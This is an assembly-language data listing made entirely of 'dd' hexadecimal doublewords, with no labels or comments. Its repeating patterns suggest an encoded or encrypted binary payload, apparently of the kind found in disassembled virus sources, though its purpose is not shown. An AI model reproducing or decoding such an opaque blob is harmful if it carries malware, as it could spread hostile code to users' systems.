		dd 0FD27DCC0h, 0B9F674EFh, 6477E8FFh, 3D33FFFCh, 0EE45C3B1h
		dd 5EEFFD00h, 6D907F3Eh, 7F6D907Fh, 6A037655h, 0AAE08702h
		dd 4E9910EEh, 0EFFD00h,	0D8898BADh, 0EFFD00EFh,	5DF1181h
		dd 0AB53EFFDh, 0DCF57564h, 0D964AAC0h, 9889E977h, 0D405831Fh
		dd 60F7A0Fh, 3433EFFDh,	48E58865h, 2410ED00h, 0FDA65370h
		dd 0FF3E81FFh, 6AEFFD02h, 0E8FFBCFCh, 0FFFC61AFh, 641BB08Bh
		dd 0FD00E274h, 0B1A200EFh, 5D0A765Bh, 7600E73Fh, 0EF9704BCh
		dd 85FD6Ah, 0FDA86D76h,	87AD00EFh, 10EF9CC0h, 0FD01CF14h
		dd 0EBAE8BEFh, 85FC6Ah,	7F8BEF97h, 0EFFD0047h, 636F9550h
		dd 0FBE9FFFDh, 64FD00EEh, 85F953h, 0FD6AEF97h, 0EF558264h
		dd 68BFFD00h, 0ED008B9Dh, 0EFFDEC06h, 4BC7600h,	0FD6AEF97h
		dd 6D760085h, 0EFFDA8h,	984087ADh, 3D1410EFh, 8BEFFD00h
		dd 0FC6AEBAEh, 0EF970085h, 477F8Bh, 9550EFFDh, 0FFFD624Fh
		dd 0EF45E9h, 970185FDh,	85FD6AEFh, 5F9F9500h, 0FD6AFFFDh
		dd 9E150085h, 8BEFFD36h, 0FD6AEBAEh, 0EF970085h, 477F8Bh
		dd 9550EFFDh, 0FFFD66CFh, 85FD6Ah, 0FD36BC15h, 0BB768BEFh
		dd 83EFFD9Eh, 7989D739h, 0EFFF1464h, 54647600h,	0BC00EF63h
		dd 64740A85h, 0EF6354h,	9CFCFA02h, 0A27610EEh, 0D6699F4h
		dd 0FD00EFFDh, 64A65EB0h, 82DA0E5h, 0BB0085FDh,	87AB0085h
		dd 10EF9C80h, 0FD6AEF97h, 8E651510h, 0FFBFED01h, 0FC610FE8h
		dd 10F76AFFh, 18E0115h,	94D64EDh, 0EFF0898Bh, 5FEFFD00h
		dd 188BB4A3h, 0EFF5C2B2h, 6AEBAE8Bh, 970085FDh,	477F8BEFh
		dd 50EFFD00h, 0FD67EF95h, 85FD6AFFh, 35291500h,	768BEFFDh
		dd 0EFFD9EBBh, 89F33983h, 0FF146479h, 6C7600EFh, 0EF6354h
		dd 0A98366BDh, 64FD0071h, 898B094Dh, 0FD00EFF0h, 0B4A35FEFh
		dd 0C2B2188Bh, 0FC6AEFF5h, 85BB0085h, 0E087AB00h, 9710EF9Ah
		dd 7FD6AEFh, 0EFC880h, 63547C76h, 2B7E00EFh, 936B741Ch
		dd 0FD00EDE9h, 71A98B64h, 6AAEFD00h, 0A98B66E3h, 10FD0071h
		dd 18E0115h, 94D64EDh, 0EFF0898Bh, 5FEFFD00h, 188BB4A3h
		dd 0EFF5C2B2h, 9107AB46h, 14FF1035h, 0EFFD0430h, 85FC6Ah
		dd 0AB0085BBh, 0EF944087h, 6AEF9710h, 0C82607FDh, 647600EFh
		dd 0EF6354h, 741C2B7Eh,	0EDE98B6Bh, 8B64FD00h, 0FD0071A9h
		dd 66E96AAEh, 71A98Bh, 11510FDh, 64ED018Eh, 898B094Dh
		dd 0FD00EFF0h, 0B4A35FEFh, 0C2B2188Bh, 0D4E8EFF5h, 6402FF26h
		dd 898B094Dh, 0FD00EFF0h, 0B4A35FEFh, 0C2B2188Bh, 2F33EFF5h
		dd 0BDFC5665h, 0DD66E8h, 0F96906FDh, 6CBB00EFh,	53B9EDC3h
		dd 2C98415h, 0E7398310h, 641BB08Bh, 0FD00E274h,	0B1A200EFh
		dd 5D0A765Bh, 0BB00E73Fh, 29B3E8B9h, 0C46C02FFh, 0F2C06BF9h
		dd 0EFF9396Bh, 0E8247600h, 0FD00EB11h, 8B094D64h, 0EFF089h
		dd 0A35FEFFDh, 0B2188BB4h, 46EFF5C2h, 0AB102C7Eh, 2673E8BCh
		dd 0C46C02FFh, 94D64F5h, 0EFF0898Bh, 5FEFFD00h,	188BB4A3h
		dd 0EFF5C2B2h, 0FCAA3A46h, 0FD00EFFDh, 1527E8B9h, 0C46C02FFh
		dd 89C06AF9h, 0EBB68BCAh, 6AE4B88Dh, 0B8C6BFFCh, 0DE1580E4h
		dd 8B100293h, 74641BB0h, 0EFFD00E2h, 5BB1A200h,	3F5D0A76h
		dd 0A27000E7h, 51EE970Bh, 3B04A476h, 77C0BAAh, 0FF106E0Ch
		dd 99F4A276h, 0EFFD0D66h, 5EB0FD00h, 0A0E564A6h, 57FD082Dh
		dd 10EF5E0Dh, 94D643Eh,	0EFF0898Bh, 5FEFFD00h, 188BB4A3h
		dd 0EFF5C2B2h, 83EE838Dh, 3D331034h, 0ED014528h, 0F2EFFD00h
		dd 0D6D11853h, 3E765016h, 40500A8Bh, 9510EE00h,	0FFFD9EBFh
		dd 0F3ED14C1h, 7ECA6458h, 4B0E030Eh, 6367E8FFh,	0BDA1FFFCh
		dd 6AED02EEh, 8BC089C0h, 0B88DEBB6h, 0BFFC6AE4h, 80E4B8C6h
		dd 2926015h, 0AFF8C710h, 0FFFF01h, 7600EFFDh, 6699F4A2h
		dd 0EFFD0Dh, 0A65EB0FDh, 2DA0E564h, 4D62FD08h, 0AC018512h
		dd 29F94B64h, 0E86E1245h, 2FF7D9Dh, 8B094D64h, 0EFF089h
		dd 0A35FEFFDh, 0B2188BB4h, 0B8EFF5C2h, 0ED004C44h, 1BB08B2Ch
		dd 0E27464h, 0A200EFFDh, 0A765BB1h, 0E73F5Dh, 0FCD8A75Ch
		dd 0EEB7B9FFh, 0BD62FD00h, 2FF1539h, 1C02F86Ch,	0BF6BF2A5h
		dd 7E00EFFFh, 1006D452h, 249AFCFFh, 6D07A76h, 6A76FF10h
		dd 0FF1006CCh, 6C86276h
		dd 0BFAFFF10h, 0FA27688Dh, 0AF511002h, 102C5F07h, 102B7EFFh
		dd 6D4527Eh, 9AFFFF10h,	0D06A7624h, 76FF1006h, 1006CC62h
		dd 0C87A76FFh, 0ADFF1006h, 27788DBEh, 521002FAh, 2E6207ADh
		dd 2B7EFF10h, 0D4527E10h, 0FEFF1006h, 6276249Ah, 0FF1006D0h
		dd 6CC7A76h, 6A76FF10h,	0FF1006C8h, 708DBDACh, 1002FA27h
		dd 6507AC50h, 7EFF1028h, 527E102Bh, 0FF1006D4h,	76249AF9h
		dd 1006D07Ah, 0CC6A76FFh, 76FF1006h, 1006C862h,	8DBFAFFFh
		dd 2FA2768h, 7AF5110h, 0FF102048h, 7E102B7Eh, 1006D452h
		dd 249AF8FFh, 6D06A76h,	6276FF10h, 0FF1006CCh, 6C87A76h
		dd 0BEADFF10h, 0FA27788Dh, 0AD521002h, 10244B07h, 102B7EFFh
		dd 6D4527Eh, 9AFBFF10h,	0D0627624h, 76FF1006h, 1006CC7Ah
		dd 0C86A76FFh, 0ACFF1006h, 27708DBDh, 501002FAh, 23DE07ACh
		dd 2B7EFF10h, 0D4527E10h, 0FAFF1006h, 7A76249Ah, 0FF1006D0h
		dd 6CC6A76h, 6276FF10h,	0FF1006C8h, 688DBFAFh, 1002FA27h
		dd 6107AF51h, 7EFF101Dh, 527E102Bh, 0FF1006D4h,	76249AF5h
		dd 1006D06Ah, 0CC6276FFh, 76FF1006h, 1006C87Ah,	8DBEADFFh
		dd 2FA2778h, 7AD5210h, 0FF101854h, 7E102B7Eh, 1006D452h
		dd 249AF4FFh, 6D06276h,	7A76FF10h, 0FF1006CCh, 6C86A76h
		dd 0BDACFF10h, 0FA27708Dh, 0AC501002h, 10147707h, 102B7EFFh
		dd 6D4527Eh, 9AF7FF10h,	0D07A7624h, 76FF1006h, 1006CC6Ah
		dd 0C86276FFh, 0AFFF1006h, 27688DBFh, 511002FAh, 11FA07AFh
		dd 2B7EFF10h, 0D4527E10h, 0F6FF1006h, 6A76249Ah, 0FF1006D0h
		dd 6CC6276h, 7A76FF10h,	0FF1006C8h, 788DBEADh, 1002FA27h
		dd 4D07AD52h, 7EFF100Dh, 527E102Bh, 0FF1006D4h,	762B9AF1h
		dd 1006D062h, 0CC7A76FFh, 76FF1006h, 1006C86Ah,	8DBDACFFh
		dd 2FB3370h, 7A705010h,	0FF1007C8h, 0F4E8BDACh,	6C02FF0Eh
		dd 0BD6CE9C4h, 2FF1429h, 64D675E2h, 0FF142D85h,	318D6402h
		dd 6402FF14h, 0FF143595h, 7051BF02h, 1006DC6Ah,	8D62AFFFh
		dd 2FF1535h, 4A1551BFh,	831002D9h, 4083FB39h, 1002FB3Bh
		dd 8BDD880Eh, 2FD0F68h,	33788B10h, 8B1002FDh, 2FB3F70h
		dd 7A765210h, 0FF1006CCh, 358564ADh, 0BE02FF14h, 0C8627052h
		dd 0ADFF1007h, 1B67E8BEh, 0C46C02FFh, 0F95364E5h, 0EF558264h
		dd 0E8BFFD00h, 2FF1735h, 0EA3A1904h, 10EE2548h,	0FD00EFFCh
		dd 64F94B64h, 0EF5591h,	50E8BDFDh, 6C02FF17h, 4D64F9C4h
		dd 995EB009h, 0EFFD0D66h, 8BB4FD00h, 0F5C2B218h, 0EFB48DEFh
		dd 10EF62D5h, 0ED00700Ah, 0FFFDA0FEh, 10EF5D2Bh, 0ED004F84h
		dd 0FFFDA0AAh, 10EF5C1Ch, 0ED004D7Ah, 0FFFDA247h, 10EF5E20h
		dd 0ED004F18h, 0FFFDA0B0h, 10EF5ECCh, 0ED004977h, 0FFFDA2C5h
		dd 10EF5F6Dh, 0ED004E97h, 0FFFDA2B4h, 10EF5F12h, 0ED004E39h
		dd 0FFFDA157h, 10EF5F3Ah, 0ED00495Bh, 0F9EB01EFh, 16F9EB16h
		dd 0EB16F9EBh, 0F9EB16F9h, 16F9FF16h, 0EB16F9EBh, 0ECEB16F9h
		dd 16F9EB16h, 0EB16F9F9h, 0F9EB06EAh, 16F9EB16h, 0F709E7FAh
		dd 0E1F00CE4h, 16FEED0Fh, 0E814FCEFh, 7F6D907Fh, 907F6D90h
		dd 6D907F6Dh, 0E6DDEC6Eh, 57B9FD00h, 0FD00AF44h, 623D33EFh
		dd 0C6CAD97Ch, 0FD24CBB9h, 449BAB1Ch, 11044AAh,	3D33EFFDh
		dd 0C6D9BC62h, 0C6EFFD01h, 0FC28CB79h, 1CFD00EFh, 0AA449BABh
		dd 0FD00EA44h, 315DBEEFh, 7C62ED01h, 0B98DE3D9h, 4A0E24CBh
		dd 0EEF968h, 0FD6ABFFDh, 23E8FF4Bh, 8DFFFC61h, 0FC28CB71h
		dd 7B9500EFh, 51FFFCDEh, 9C44FA02h, 0DA7610EEh,	10EE9C88h
		dd 0FD00E542h, 0CB698DEFh, 0EFFC28h, 0FCDE9795h, 390252FFh
		dd 8D01884Fh, 0FC28CB79h, 9F9500EFh, 50FFFCDEh,	0B18D3902h
		dd 7B7024CBh, 0EED524h,	252BEFDh, 0CB798D39h, 0EFFC28h
		dd 0FCDE8395h, 390250FFh, 28CB718Dh, 9500EFFCh,	0FFFCDE8Bh
		dd 8D390251h, 700CCBA9h, 0EED5246Bh, 50BDFD00h,	718D3902h
		dd 0EFFC28CBh, 0DEB39500h, 251FFFCh, 85FD6A39h,	6AED9700h
		dd 700085FDh, 87DD24BBh, 40EFFD00h, 2D1510AFh, 64ED018Eh
		dd 24AB70F0h, 0AD0085F5h, 0DFD98C62h, 68EFFD01h, 0FD00E7FDh
		dd 0FA0256BEh, 10EE9CE8h, 1D1510ABh, 62ED018Eh,	6AE3D954h
		dd 0E8FFBDFDh, 0FFFC616Bh, 1510FD6Ah, 0ED018E7Dh, 7F6D5EB0h
		dd 907F6D90h, 5681097h,	8BED01B8h, 0EFFDA1h, 7464BFFDh
		dd 0EFFD00CAh, 4464AC00h, 7656FBD9h, 9B74501Eh,	1907F524h
		dd 7600EFFEh, 0CBB9C721h, 0EFFD10h, 0D10628FDh,	7ED018Ah
		dd 0EFFD54h, 10E82176h,	64FD00ECh, 8BE7D94Ch, 7464B13Bh
		dd 0EFFD00E2h, 102B7E00h, 6D00EB3Fh, 7F6D907Fh,	907F6D90h
		dd 15F164ABh, 0EFFD00F7h, 8CBB9F6h, 0AB099BFCh,	0EF5B6107h
		dd 42B7E00h, 3F5E2976h,	7F6D00EBh, 65C3FCC7h, 0F8E9FFFCh
		dd 7FFD00ECh, 907F6D90h, 0D94462ACh, 0BFFF6AEDh, 0ACBB9C6h
		dd 0D9442986h, 0F61501E4h, 59EFFD03h, 6D907F3Eh, 7F6D907Fh
		dd 56BAAE51h, 0E5249B76h, 0CBB189B8h, 1817010h,	24085A8h
		dd 0EE9DBCFAh, 8B217610h, 7618CB89h, 2E3C8B37h,	7B62FFE9h
		dd 810329FCh, 2776A51Ch, 30E7E55h, 76A41CAEh, 7E524A3h
		dd 0EFFFD0h, 2F064AEh, 0EE9DB0FAh, 5F297610h, 0A45BB2A3h
		dd 7FFD082Dh, 907F6D90h, 6D907F6Dh, 7F6D907Fh, 1E31181h
		dd 0A853EFFDh, 0CBB189B9h, 0DBDCAA0Ch, 0FD00AF44h, 623D33EFh
		dd 88F6D97Ch, 0E18CBA1h, 45566644h, 18CBB98Dh, 0FD01EB95h
		dd 0B37450EFh, 1510E124h, 0ED018F35h, 5002C96Ch, 10EE2E58h
		dd 0A98D2FCEh, 410F18CBh, 0F9C42CF7h, 76E964AEh, 10348318h
		dd 0AE1D078Bh, 3C4F2276h, 4A0E0206h, 5462308Bh,	1C83F3D9h
		dd 0EF7D68ECh, 0A41CFD00h, 0FCE51742h, 103483FFh, 0D11853F2h
		dd 0FE6A16D6h, 676F764h, 0C96C078Bh, 76AE1D02h,	63C4F22h
		dd 8B4A0E02h, 0D9546230h, 0EC1C83CBh, 0BF4B0E53h, 0ED0134C9h
		dd 1D02C96Ch, 2B3E0AAEh, 76018504h, 64148B18h, 0FF267EFAh
		dd 308B410Fh, 0ED14C1A0h, 0CD6458F3h, 0D124AB70h, 87FEE16Ch
		dd 80EFFD00h, 2504B0Eh,	0EE9CD0FAh, 83077610h, 0B3741000h
		dd 0FA0255BCh, 10EE9CD4h, 15571776h, 0EFFDA43Fh, 8DEB3983h
		dd 7614CBB1h, 0B8AC531Fh, 1510A856h, 0ED018E21h, 14C6C0DCh
		dd 1C65F376h, 9FF36FCDh, 0AFCD1C67h, 0F29D3A3Bh, 0ED24A376h
		dd 921556B8h, 561002FEh, 66E83776h, 6CFD004Bh, 0FFBAF9C4h
		dd 0FC610FE8h, 64A35FFFh, 81B4A0C3h, 0FD01E339h, 7F6DC3EFh
		dd 907F6D90h, 6D907F6Dh, 7F6D907Fh, 1EB1181h, 0AA56EFFDh
		dd 0FFD9BC64h, 8BEFFD01h, 0DE3F6F0Ch, 7A15059Ah, 801002FEh
		dd 0FA75F0C2h, 2615CE64h, 80EFFD01h, 780FCDC2h,	0EFFD004Ch
		dd 24AB7053h, 0FC0487F1h, 10AD00EFh, 18F3515h, 2C96CEDh
		dd 0EE2E5850h, 8D2FCE10h, 0F0CCBA9h, 0C42CF741h, 8B3676F9h
		dd 2C96C0Ah, 410FFA64h,	0C1A0368Bh, 58F3ED14h, 0BB70CB64h
		dd 0E16CF124h, 42A41CFEh, 0FFFCE517h, 0F2103483h, 0D6D11853h
		dd 640A8B16h, 831576D9h, 53F21034h, 2EB2CB64h, 0A51CFFE9h
		dd 0A98D2476h, 0E7E0CCBh, 0BF4B0E03h, 0ED0134C9h, 1D02C96Ch
		dd 2B3E0AAEh, 76F76404h, 6C078B36h, 0AE1D02C9h,	3C4F2476h
		dd 4A0E0206h, 4462368Bh, 1C83E3D9h, 4B0E50ECh, 61CFE8FFh
		dd 0A25BFFFCh, 0EB3981B1h, 0C2EFFD01h, 6D90EFF5h, 640C8BB9h
		dd 56E7D94Ch, 9834E93Ah, 0A17410EEh, 8CC51504h,	0FD6A1002h
		dd 0EE970085h, 1510FD6Ah
		dd 0ED018E91h, 64F54666h, 42DA3C6h, 6D907FFDh, 70C8BB9h
		dd 0EFFD18h, 0F524AB0Bh, 0B9F474EEh, 4CACE8h, 0F9C46CFDh
		dd 2DA3C664h, 907FFD04h, 3A08AE76h, 0EE9834EEh,	1510AD10h
		dd 0ED018E1Dh, 7F6D902Ch, 907F6D90h, 6D907F6Dh,	7F6D907Fh
		dd 90EFF5C2h, 6D907F6Dh, 7F6D907Fh, 907F6D90h, 97EC64A8h
		dd 0B7ED6810h, 0A18BED01h, 0FD00EFFDh, 0CA7464BFh, 0EFFD00h
		dd 7608037Eh, 0A67608BAh, 0C0DCAE04h, 0B889B8ABh, 13B88903h
		dd 89E3B88Bh, 0AF501F98h, 10746707h, 0F4A276FFh, 0FD0D6699h
		dd 0B0FD00EFh, 0E564A65Eh, 0FD082DA0h, 0EF51B257h, 4D643E10h
		dd 11456409h, 66995EB0h, 0EFFD0Dh, 188BB4FDh, 0EFF5C2B2h
		dd 907F6D90h, 6D907F6Dh, 85F54164h, 1510ADFFh, 0ED018E3Dh
		dd 0EFFC2C87h, 0FCFA0200h, 3E10EE9Ch, 7F6D907Fh, 907F6D90h
		dd 0AD08AE76h, 8E991510h, 902CED01h, 6D907F6Dh,	837655BCh
		dd 57B9F124h, 9F88D276h, 34CE10EEh, 185088Bh, 0FCD3F395h
		dd 380256FFh, 85E33983h, 0BE049A3Dh, 0B016EBA9h, 5EC4F98Dh
		dd 6DC3B4A0h, 85118BBAh, 65AF95FFh, 0CD68FFFCh,	8BED01A0h
		dd 0EFFDA1h, 7464BFFDh,	0EFFD00CAh, 4C037C00h, 0AE00EFFFh
		dd 34CE57B9h, 0B933A089h, 0FD00EFF5h, 5270C0DCh, 0FF1003B4h
		dd 0BCB9440Eh, 62FD00EFh, 0FF1129BDh, 44AB1C02h, 0EFFD00AEh
		dd 0FD47408Dh, 56F31002h, 62015D66h, 0FF125985h, 0E468BF02h
		dd 0BCFD02EFh, 51E3B08Bh, 0AF08BA76h, 8FD11510h, 0C06AED01h
		dd 0B8C7C889h, 1002FF33h, 0FCAA3AFFh, 2FF1002h,	0EFFE9607h
		dd 0DCAA7600h, 99F0A276h, 0EFFD0D66h, 5EB0FD00h, 0A0E564A6h
		dd 0CBB88B2Ch, 0FEC0583h, 0FD01EE7Ah, 6AD9FFEFh, 10EF4C7Ch
		dd 0B514AA76h, 0E0FBF86Ch, 0EF1087h, 782410FDh,	0FFFDB163h
		dd 40BB8C7h, 7000EFFCh,	62ACE4A2h, 0FF112995h, 0B88DBD02h
		dd 64AE50FBh, 8BBEED4Dh, 2FD4B68h, 0FA025210h, 10EE9D24h
		dd 780F2F78h, 0EFFD0059h, 0FE3B788Dh, 15501002h, 1002FE3Fh
		dd 8BEB3983h, 3A7E0405h, 0EEF9E4AAh, 4562FD00h,	708DBF19h
		dd 1002FE3Bh, 14BA7051h, 0B88BBCAFh, 627650FFh,	0FF1000A4h
		dd 0D91510ACh, 6AED018Fh, 8D9888C0h, 2FE3B48h, 37888910h
		dd 622BE08Bh, 0C08BFFFCh, 0FFFC6243h, 74EFC380h, 0FC0487CFh
		dd 62AB00EFh, 0FF125595h, 2AFFBD02h, 0EFFC0487h, 0D3F39500h
		dd 788DFFFCh, 1002FD47h, 6A380250h, 2EFFB9FDh, 0AFDDC46Ch
		dd 75660D8Bh, 70C90425h, 1000A852h, 0FF267EFFh,	53F22FCEh
		dd 16D6D118h, 0F7642C8Bh, 3C189276h, 4A0E0206h,	0E16C378Bh
		dd 3AA41CFEh, 0EFFCDCAAh, 4528FD00h, 2FF1001h, 0ED94E810h
		dd 4564FD00h, 0D4D6421h, 0EFF0898Bh, 5FEFFD00h,	188BB4A3h
		dd 0AA3AC3B2h, 0EFF9E4h, 194562FDh, 5F708DBFh, 511002FEh
		dd 0AF14BA70h, 0FFB88BBCh, 0A4627650h, 0ACFF1000h, 8FD91510h
		dd 0C06AED01h, 688B5B88h, 1002FE5Fh, 0DFD39552h, 0B88BFFFCh
		dd 0FA0250F7h, 10EE9E4Ch, 160C2B7Eh, 0CFB08B7Dh, 8D0BB089h
		dd 76520BA8h, 62AD1CAAh, 53BEE94Dh, 0AF10BA76h,	12598564h
		dd 0FFBF02FFh, 0FC60CBE8h, 0E03D85FFh, 0FF109085h, 2610602h
		dd 0AE44FF10h, 33EFFD00h, 29BD623Dh, 1C02FF11h,	0E4AA3AABh
		dd 0FD00EEF9h, 66BEC364h, 0FF11519Dh, 97008502h, 85FD6AEFh
		dd 0E4A27000h, 299562ACh, 0BD02FF11h, 0A46A7650h, 0ADFF1000h
		dd 8FE51510h, 0C06AED01h, 2206AF2h, 6270FF10h, 0FF1003D4h
		dd 223487ACh, 7A7010EEh, 0FF1000A8h, 0B11510AFh, 6CED018Ch
		dd 0BD62F1C4h, 2FF1255h, 0DC02C96Ch, 0F7410FC0h, 76F9C42Ch
		dd 642C8B18h, 0C96CE57Dh, 0B2AE1D02h, 63CCA64h,	8B4A0E02h
		dd 0FEE16C37h, 0AA3AA41Ch, 0EFFCDCh, 26406FDh, 0DA76FF10h
		dd 10EE9E4Ch, 0FD00E744h, 623D33EFh, 0FF1149BDh, 44AB1C02h
		dd 0EFFD00AEh, 0FE3B408Dh, 56F31002h, 0EFFD4156h, 0A8527000h
		dd 0EFF1000h, 0FB8C744h, 0EFFD20h, 0F9E4AA3Ah, 64FD00EEh
		dd 9D66BEC3h, 2FF1151h,	0BE194D62h, 0FE3B688Dh,	70521002h
		dd 85AC14A2h, 0E0BA7000h, 498D62AFh, 0BE02FF11h, 0A47A7650h
		dd 0AFFF1000h, 8FE11510h, 0C06AED01h, 3546AF2h,	0AA76FF10h
		dd 0F86CB514h, 6287E0FBh, 10FD00EFh, 0B1477824h, 708DFFFDh
		dd 1002FE3Bh, 0DFC39551h, 0F1EBFFFCh, 11298D62h, 68BE02FFh
		dd 0ED0130E1h, 11499562h, 68BD02FFh, 0ED0130F5h, 12558562h
		dd 0FFBF02FFh, 0E9C46C2Bh, 62706404h, 0FF1003D4h, 299562ACh
		dd 0BD02FF11h, 1310168h, 498562EDh, 0BF02FF11h,	1311968h
		dd 558D62EDh, 0BE02FF12h, 0C46C2BFFh, 953704E5h, 0FFFCDE3Bh
		dd 0FE5B688Dh, 95521002h, 0FFFCDE2Bh, 0FD47788Dh, 16501002h
		dd 314568F7h, 8D62ED01h, 2FF1149h, 313968BEh, 9562ED01h
		dd 2FF1255h, 6C2BFFBDh,	8562EDC4h, 2FF1255h, 0F7B08BBFh
		dd 88FA0251h, 3A10EE9Ch, 0EFFCDCAAh, 0C506FD00h, 76FF1003h
		dd 64AF08BAh, 18FDD35h,	76D610EDh, 1000A46Ah, 0D610ADFFh
		dd 2145643Eh, 8B0D4D64h, 0EFF089h, 0A35FEFFDh, 0B2188BB4h
		dd 0A670C3h, 0ED00421Dh, 0FFFDAF9Dh, 10EF4D0Eh,	0ED00412Eh
		dd 0FFFDAD1Bh, 10EF50F4h, 0ED0040BCh, 0FFFDAE15h, 10EF53DAh
		dd 0ED004127h, 0FFFDAED8h, 10EF4D9Ah, 0ED005F55h, 0FFFDB1FAh
		dd 10EF4DCEh, 0ED005ECFh, 0FFFDB1DDh, 10EF4DFBh, 6D907F6Dh
		dd 7F6D907Fh, 907F6D90h, 97EC64A8h, 8AAD6810h, 3087ED01h
		dd 9910EEB2h, 0EFFD004Eh, 898BAD00h, 0FD00EFD8h, 0FB1183EFh
		dd 33B8AB53h, 195D6626h, 64015D66h, 0F86CDD45h,	0E987E0FEh
		dd 10FD00EEh, 0B3BF7824h, 0B88DFFFDh, 0A270500Fh, 68BCACDCh
		dd 0FD0FEFC2h, 64AE53BCh, 8BBDF155h, 250E7B8h, 0EE9D0CFAh
		dd 0F2F7810h, 0FD000978h, 33B08DEFh, 0F09551h, 7653EFFFh
		dd 64AF0CBAh, 0FFBFF545h, 0FC60C3E8h, 0E03D85FFh, 0EF3B85h
		dd 0E95564FDh, 69F2D3D4h, 0EFFDBBh, 8B02157Eh, 0EB0783C4h
		dd 42780Fh, 7052EFFDh, 0BDAC1CA2h, 10BA7653h, 214564AFh
		dd 0DFE8FFBFh, 85FFFC60h, 6D85E03Dh, 6FD00EFh, 0EFFD84h
		dd 76189A76h, 10348311h, 0AE1D3D33h, 0AB513E0Ah, 0A27653BDh
		dd 5564AC10h, 0E8FFBD21h, 0FFFC60DFh, 679A3D85h, 0B88DB116h
		dd 0F0955033h, 53EFFF00h, 0AC0CA276h, 0BDF55564h, 60C3E8FFh
		dd 3D85FFFCh, 0AA76499Ah, 4D64AD10h, 0E8FFBE21h, 0FFFC60FFh
		dd 379A3D85h, 0A88DC116h, 0F0955233h, 53EFFF00h, 0AD0CAA76h
		dd 0BEF54D64h, 60C3E8FFh, 3D85FFFCh, 0BA76199Ah, 4564AF10h
		dd 0E8FFBF21h, 0FFFC60FBh, 79A3D85h, 0FCE4AA3Ah, 28FD00EFh
		dd 0FF100145h, 0E9E81002h, 64FD00EFh, 4D641945h, 0F0898B0Dh
		dd 0EFFD00EFh, 8BB4A35Fh, 76C3B218h, 64AC08A2h,	18FDD35h
		dd 76D610EDh, 10AFDCBAh, 0FF643ED6h, 0ED005DF3h, 0FFFDB2DAh
		dd 10EF4FB6h, 0ED005D1Bh, 0D195FF85h, 64FFFC58h, 0FD00EF5Ch
		dd 669950EFh, 0EFFD25h,	0B9EC6CFDh, 0BBD94464h,	57B9A853h
		dd 74501E76h, 7E9249Bh,	0FF100554h, 0A124AB3Ah,	0EFFD00EFh
		dd 64CBBBC7h, 3A10EE98h, 65E924ABh, 0C7EFFD7Fh,	0FD18CBB9h
		dd 28FD0090h, 3F3D944h,	3A00EF82h, 66DD24ABh, 0C7EFFD7Fh
		dd 7624CBB9h, 28FD0090h, 1C7D944h, 3A00EF82h, 6ED124ABh
		dd 0C7EFFD7Fh, 7530CBB9h, 28FD0090h, 80DBD944h,	3A00EF82h
		dd 69C524ABh, 0C7EFFD7Fh, 7E3CCBB9h, 28FD0090h,	85AFD944h
		dd 3A00EF82h, 6DB924ABh
		dd 0C7EFFD7Fh, 7948CBB9h, 28FD0090h, 4A3D944h, 3A00EF82h
		dd 0EDAD24ABh, 8DEFFD7Fh, 7014CB91h, 0FF466891h, 8BEFFD00h
		dd 9750EFB8h, 2FBA89EFh, 6363E8FFh, 0FA89FFFCh,	6CF9C56Ch
		dd 75A4F9C7h, 0FD01541Bh, 0FF9500EFh, 88EFFD01h, 3A60CBA1h
		dd 0EE985CE9h, 13B17510h, 0F518A93Ah, 7FD00EFh,	0EF660Ch
		dd 74042B7Eh, 6A9924ABh, 24AB3BC0h, 0F274EDA1h,	0EF976485h
		dd 0C864F56Ah, 0FD0A0015h, 0DCFFEBEFh, 85AEC0h,	9556EF97h
		dd 0FFFDBA5Fh, 85FD6Ah,	8524B375h, 0EF558666h, 5E67FD00h
		dd 0EF4629EDh, 0FEBBC6EFh, 14A93B00h, 0DF4E07FDh, 85AE00EFh
		dd 56EF9700h, 0FDBBCF95h, 85FD6AFFh, 1CA97400h,	0FD22D815h
		dd 0CB718BEFh, 0EFFD8Ch, 74382B7Eh, 297620A9h, 5BB2A35Fh
		dd 0FD0D6699h, 6CFD00EFh, 42DADC4h, 6D907FFDh, 7F6D907Fh
		dd 90F27653h, 0AB10EE9Eh, 8BFCC7B8h, 8DFFFC65h,	0EDBFAB8Ch
		dd 64FD00EFh, 0D310AD06h, 0B204297Eh, 0B1A2F59Ah, 907F3E5Bh
		dd 6D907F6Dh, 7F6D907Fh, 90F27653h, 0A810EE9Eh,	0B8ABE964h
		dd 64EFB8C7h, 7010EE98h, 0FF42449Ah, 8BEFFD00h,	2EFFBFFBh
		dd 0A0F9C66Ch, 44190875h, 8901FBD9h, 0CC1555E6h, 83EFFD9Ah
		dd 765FEB39h, 0B4A05E2Ah, 90EFF9C2h, 15F164ABh,	0EFFD00F7h
		dd 8CBB9F6h, 0AB099BFCh, 0EF670107h, 42B7E00h, 3F5E2976h
		dd 7F6D00EBh, 6387026Ah, 9910EEA5h, 0EFFD004Eh,	898BAD00h
		dd 0FD00EFD8h, 0BAAE51EFh, 571E7656h, 0ED249B74h, 8AA10628h
		dd 3D64ED01h, 0ED018EBDh, 85EF4662h, 4428AD00h,	0FD01CBD9h
		dd 380200EFh, 6AFFB38Dh, 2AFFBEFDh, 64E15664h, 18E3D3Dh
		dd 0AFFF85EDh, 0A976D710h, 50109720h, 0B38B3802h, 0FC08BF3h
		dd 51FFFC61h, 0AB8B3802h, 380252CFh, 47738Bh, 3485EFFDh
		dd 0EE76069Bh, 1010FC6Ah, 9E90C276h, 0A93A10EEh, 18A9924h
		dd 957E62EDh, 0EFFD1054h, 51E07600h, 3A833A02h,	1A884BEBh
		dd 4428338Bh, 2FFF3D9h,	0EA15FF10h, 8B1002F6h, 0A214CBB1h
		dd 8BA65DB1h, 0EFF089h,	3983EFFDh, 7F6DC3FFh, 0EF5C64h
		dd 26AEFFDh, 0EEA59187h, 898BAD10h, 0FD00EFD8h,	1E7656EFh
		dd 8B109757h, 0BBC6F3BBh, 10AD00FFh, 18E3D15h, 0E14E64EDh
		dd 0FE8FFBEh, 8BFFFC61h, 0FD004773h, 9B3485EFh,	6AFE7606h
		dd 761210FCh, 6CE52493h, 2C9AFEFFh, 0FD01FF95h,	7727E8EFh
		dd 0C46CFD00h, 0D94466F9h, 283D85F7h, 0FFD944h,	8900EFFDh
		dd 85996A89h, 8BEB9701h, 0F5BA0735h, 0B61600EFh, 68E80283h
		dd 0FD00EEEDh, 4615279Ah, 83EFFD98h, 0B989EB39h, 2F7818CBh
		dd 10CBB9C7h, 0FD00EFFCh, 8B97359Bh, 885FC6Ah, 74E82776h
		dd 4FD00E7h, 986D1528h,	3983EFFDh, 0CBB989EBh, 0C72F7818h
